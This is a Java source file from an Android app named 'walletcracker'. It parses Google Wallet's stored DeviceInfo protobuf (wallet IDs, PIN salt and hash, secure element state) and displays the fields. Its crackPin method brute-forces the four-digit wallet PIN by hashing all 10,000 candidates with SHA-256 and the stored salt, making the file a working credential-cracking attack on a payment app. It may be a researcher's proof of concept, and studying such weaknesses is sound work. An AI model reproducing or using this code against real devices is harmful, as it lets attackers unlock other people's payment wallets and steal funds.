package com.zvelo.walletcracker;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.google.protobuf.ByteString;
import com.google.protobuf.Descriptors.EnumValueDescriptor;
import com.google.protobuf.Descriptors.FieldDescriptor;
import com.google.protobuf.InvalidProtocolBufferException;
import com.google.protobuf.Message;
import com.zvelo.walletcracker.GoogleWalletProtos.DeviceInfo;

import android.content.Context;
import android.util.Log;

public class DeviceInfoParser {
  protected static final String HEX_DIGITS = "0123456789abcdef";
  protected final String TAG = this.getClass().getSimpleName();
  protected Context _context;
  protected DeviceInfo _deviceInfo;
  protected static Map<String, Integer> _pinCache = new HashMap<String, Integer>();

  public DeviceInfoParser(Context context, byte deviceInfoRaw[]) {
    _context = context;
    try {
      _deviceInfo = DeviceInfo.parseFrom(deviceInfoRaw);
    } catch (InvalidProtocolBufferException e) {
      Log.e(TAG, "Error parsing: " + e.getMessage());
    }
  }

  public List<Map<String, String>> execute() {
    List<Map<String, String>> data = new ArrayList<Map<String, String>>();
    data.addAll(addMessage("", _deviceInfo));
    return data;
  }

  private String decodeFieldName(String fieldName) {
    if (fieldName.equals("wallet_uuid")) {
      return _context.getString(R.string.wallet_uuid);
    } else if (fieldName.equals("pin_info")) {
      return _context.getString(R.string.pin_info);
    } else if (fieldName.equals("salt")) {
      return _context.getString(R.string.salt);
    } else if (fieldName.equals("pin_hash")) {
      return _context.getString(R.string.pin_hash);
    } else if (fieldName.equals("bad_pin_attempts")) {
      return _context.getString(R.string.bad_pin_attempts);
    } else if (fieldName.equals("pin_expired")) {
      return _context.getString(R.string.pin_expired);
    } else if (fieldName.equals("gaia_account")) {
      return _context.getString(R.string.gaia_account);
    } else if (fieldName.equals("c2dmreginfo")) {
      return _context.getString(R.string.c2dmreginfo);
    } else if (fieldName.equals("virgin")) {
      return _context.getString(R.string.virgin);
    } else if (fieldName.equals("setup_complete")) {
      return _context.getString(R.string.setup_complete);
    } else if (fieldName.equals("id")) {
      return _context.getString(R.string.id);
    } else if (fieldName.equals("is_registered")) {
      return _context.getString(R.string.is_registered);
    } else if (fieldName.equals("originator_id")) {
      return _context.getString(R.string.originator_id);
    } else if (fieldName.equals("local_id")) {
      return _context.getString(R.string.local_id);
    } else if (fieldName.equals("android_id")) {
      return _context.getString(R.string.android_id);
    } else if (fieldName.equals("tsa_status")) {
      return _context.getString(R.string.tsa_status);
    } else if (fieldName.equals("number")) {
      return _context.getString(R.string.number);
    } else if (fieldName.equals("updated_at_ms")) {
      return _context.getString(R.string.updated_at_ms);
    } else if (fieldName.equals("gaia_account_missing")) {
      return _context.getString(R.string.gaia_account_missing);
    } else if (fieldName.equals("cplc")) {
      return _context.getString(R.string.cplc);
    } else if (fieldName.equals("secure_element_initialized")) {
      return _context.getString(R.string.secure_element_initialized);
    } else if (fieldName.equals("secure_element_activation_complete")) {
      return _context.getString(R.string.secure_element_activation_complete);
    } else if (fieldName.equals("secure_element_activation_timestamp_in_millis")) {
      return _context.getString(R.string.secure_element_activation_timestamp_in_millis);
    } else if (fieldName.equals("setup_completion_time_in_millis")) {
      return _context.getString(R.string.setup_completion_time_in_millis);
    } else if (fieldName.equals("has_synced_instruments_once")) {
      return _context.getString(R.string.has_synced_instruments_once);
    } else if (fieldName.equals("wallet_package_name")) {
      return _context.getString(R.string.wallet_package_name);
    } else if (fieldName.equals("secure_element_transaction_generation")) {
      return _context.getString(R.string.secure_element_transaction_generation);
    } else if (fieldName.equals("partner_config")) {
      return _context.getString(R.string.partner_config);
    } else if (fieldName.equals("next_local_id")) {
      return _context.getString(R.string.next_local_id);
    } else if (fieldName.equals("state_transition_timestamp")) {
      return _context.getString(R.string.state_transition_timestamp);
    } else if (fieldName.equals("state_transition_delta_ms")) {
      return _context.getString(R.string.state_transition_delta_ms);
    }

    Log.d(TAG, "unknown field: "+fieldName);
    return fieldName;
  }

  private List<Map<String, String>>addMessage(String prefix, Message message) {
    List<Map<String, String>> data = new ArrayList<Map<String, String>>();

    for (Map.Entry<FieldDescriptor, Object> entry : message.getAllFields().entrySet()) {
      final String fieldName = entry.getKey().getName();
      final String decoded = decodeFieldName(fieldName);
      final String title = (prefix.equals("") ? "" : prefix + " => ") + decoded;

      Map<String, String> ret = new HashMap<String, String>(2);
      ret.put("title", title);

      String value;

      if (
//          fieldName.equals("state_transition_timestamp") ||
          fieldName.equals("updated_at_ms") ||
          fieldName.equals("secure_element_activation_timestamp_in_millis") ||
          fieldName.equals("setup_completion_time_in_millis")
      ) {
        Date d = new Date((Long) entry.getValue());
        ret.put("value", d.toString());
        data.add(ret);
      } else {
        switch (entry.getKey().getJavaType()) {
          case INT:
          case LONG:
          case FLOAT:
          case DOUBLE:
          case BOOLEAN:
          case STRING:
            value = entry.getValue().toString();
            ret.put("value", value);
            data.add(ret);
            break;
          case ENUM:
            ret.put("value", ((EnumValueDescriptor) entry.getValue()).getName());
            data.add(ret);
            break;
          case BYTE_STRING:
            value = ((ByteString) entry.getValue()).toStringUtf8();
            ret.put("value", value);
            data.add(ret);
            break;
          case MESSAGE:
            data.addAll(addMessage(title, (Message) entry.getValue()));
            break;
        }
      }
    }

    return data;
  }

  public Integer crackPin() {
    final Long salt = _deviceInfo.getPinInfo().getSalt();
    final String hash = _deviceInfo.getPinInfo().getPinHash().toStringUtf8();

    final String cacheKey = hash+salt;
    synchronized(_pinCache) {
      if (_pinCache.containsKey(cacheKey)) {
        Log.d(TAG, "crackPin found cached pin");
        return _pinCache.get(cacheKey);
      }
    }

    Log.d(TAG, "crackPin calculating pin...");

    for (Integer pin = 0; pin < 10000; ++pin) {
      try {
        byte calc[] = MessageDigest.getInstance("SHA256").digest((pin.toString()+salt).getBytes());

        StringBuffer hex = new StringBuffer();
        for (final byte b : calc) {
          hex.append(HEX_DIGITS.charAt((b & 0xF0) >> 4)).append(HEX_DIGITS.charAt((b & 0x0F)));
        }

        String calcHash = hex.toString();
        if (calcHash.toLowerCase().equals(hash.toLowerCase())) {
          synchronized(_pinCache) {
            _pinCache.put(cacheKey, pin);
          }
          return pin;
        }
      } catch (NoSuchAlgorithmException e) {
        Log.e(TAG, "no such algorithm");
      }
    }

    synchronized(_pinCache) {
      _pinCache.put(cacheKey, null);
    }
    Log.d(TAG, "Could not compite PIN");
    return null;
  }

  static public String formatPin(Integer pin) {
    return String.format("%04d", pin);
  }
}
